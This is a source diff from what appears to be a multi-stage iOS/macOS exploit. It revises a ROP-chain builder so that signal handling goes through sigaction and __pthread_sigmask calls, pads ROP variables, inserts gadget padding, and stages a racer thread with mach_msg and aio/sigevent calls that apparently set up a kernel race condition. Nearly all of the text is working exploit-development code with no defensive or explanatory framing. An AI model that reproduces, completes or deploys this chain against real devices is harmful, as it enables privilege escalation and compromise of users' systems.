@@ -113,7 +113,7 @@ uint64_t get_rop_var_addr(offset_struct_t * offsets, rop_var_t * ropvars, char *
 		}
 		ropvars = ropvars->next;
 	}
-	printf("Stage 3 ROP VAR %s not found\n",name);
+	printf("Stage 2 ROP VAR %s not found\n",name);
 	exit(-1);
 }
 void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
@@ -598,13 +598,17 @@ void build_databuffer(offset_struct_t * offsets, rop_var_t * ropvars) {
 	buf_in_stage += 22*8; // jump over the longjmp we have at the start of the buffer
 	rop_var_t * current_var = ropvars;
 	while (current_var != NULL) {
+		uint64_t real_size = current_var->size;
+		if (current_var->size < 8) {// there is a problem where the rop framework can only work on 64 bit values FIXME 
+			current_var->size = 8;
+		} 
 		buffer_size += current_var->size;
 		if (buffer_size > offsets->stage2_databuffer_len) {
 			printf("STAGE 3, DATABUFFER TO SMALL\n");
 			exit(-1);
 		}
 		// copy the variable into the buffer
-		memcpy(buf_pointer,current_var->buffer,current_var->size);
+		memcpy(buf_pointer,current_var->buffer,real_size);
 		current_var->stage_addr = buf_in_stage;
 		buf_pointer += current_var->size;
 		buf_in_stage += current_var->size;
@@ -646,7 +650,14 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	DEFINE_ROP_VAR("reply_port",sizeof(mach_port_t),&buf);
 	CALL_FUNC_RET_SAVE_VAR("reply_port",get_addr_from_name(offsets,"mach_reply_port"),0,0,0,0,0,0,0,0);
 
-	CALL("signal",SIGWINCH, offsets->rop_nop-0x180000000+offsets->new_cache_addr,0,0,0,0,0,0);
+	struct sigaction * myaction = malloc(sizeof(struct sigaction));
+	memset(myaction,0,sizeof(struct sigaction));
+	myaction->sa_handler = offsets->rop_nop-0x180000000+offsets->new_cache_addr;
+	myaction->sa_mask = (1 << (SIGWINCH-1));
+	DEFINE_ROP_VAR("my_action",sizeof(struct sigaction),myaction);
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG("my_action",1);
+	CALL("sigaction",SIGWINCH,0,0,0,0,0,0,0);
 
 	uint64_t * test_break_val = malloc(8);
 	*test_break_val = 0;
@@ -769,7 +780,11 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	DEFINE_ROP_VAR("reply_port",sizeof(mach_port_t),tmp);
 	CALL_FUNC_RET_SAVE_VAR("reply_port",get_addr_from_name(offsets,"mach_reply_port"),0,0,0,0,0,0,0,0);
 
-	CALL("signal",SIGWINCH, offsets->rop_nop-0x180000000+offsets->new_cache_addr,0,0,0,0,0,0);
+	DEFINE_ROP_VAR("mysigmask",sizeof(uint64_t),tmp);
+	SET_ROP_VAR64("mysigmask",(1 << (SIGWINCH-1)));
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG("mysigmask",2);
+	CALL("__pthread_sigmask",SIG_SETMASK,0,0,0,0,0,0,0);
 
 #define BARRIER_BUFFER_SIZE 0x10000
 	// spawn racer thread
@@ -795,13 +810,6 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG("thread_state",3);
 	ROP_VAR_ARG("racer_kernel_thread",5);
 	CALL("thread_create_running",0,ARM_THREAD_STATE64,0,sizeof(_STRUCT_ARM_THREAD_STATE64)/4,0,0,0,0);
-
-	DEFINE_ROP_VAR("mysigmask",sizeof(uint64_t),tmp);
-	SET_ROP_VAR64("mysigmask",(1 << (SIGWINCH-1)));
-	ROP_VAR_ARG_HOW_MANY(1);
-	ROP_VAR_ARG("mysigmask",2);
-	CALL("__pthread_sigmask",SIG_SETMASK,0,0,0,0,0,0,0);
-	
 
 
 	// we need to wait for a short amout of time till the other thread called open
@@ -1078,6 +1086,15 @@ _STRUCT_ARM_THREAD_STATE64
 	DEFINE_ROP_VAR("aios",NENT * sizeof(struct aiocb),tmp);
 	DEFINE_ROP_VAR("aio_buf",NENT,tmp);
 
+	struct sigaction * myaction = malloc(sizeof(struct sigaction));
+	memset(myaction,0,sizeof(struct sigaction));
+	myaction->sa_handler = offsets->rop_nop-0x180000000+offsets->new_cache_addr;
+	myaction->sa_mask = (1 << (SIGWINCH-1));
+	DEFINE_ROP_VAR("my_action",sizeof(struct sigaction),myaction);
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG("my_action",1);
+	CALL("sigaction",SIGWINCH,0,0,0,0,0,0,0);
+
 	DEFINE_ROP_VAR("sigevent",sizeof(struct sigevent),tmp);
 	SET_ROP_VAR32_W_OFFSET("sigevent",offsetof(struct sigevent,sigev_notify),SIGEV_SIGNAL);
 	SET_ROP_VAR32_W_OFFSET("sigevent",offsetof(struct sigevent,sigev_signo),SIGWINCH);
@@ -1123,6 +1140,8 @@ _STRUCT_ARM_THREAD_STATE64
 		ROP_VAR_ARG_HOW_MANY(1);
 		ROP_VAR_ARG64("reply_port",5); 
 		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_MSG_TIMEOUT_NONE,0,0,0 /*recv port*/, 0, MACH_PORT_NULL,0);
+
+		for (int i = 0; i < 0x100;i++) {ADD_GADGET();}
 
 		// set x0 
 		SET_X0_FROM_ROP_VAR("should_race");
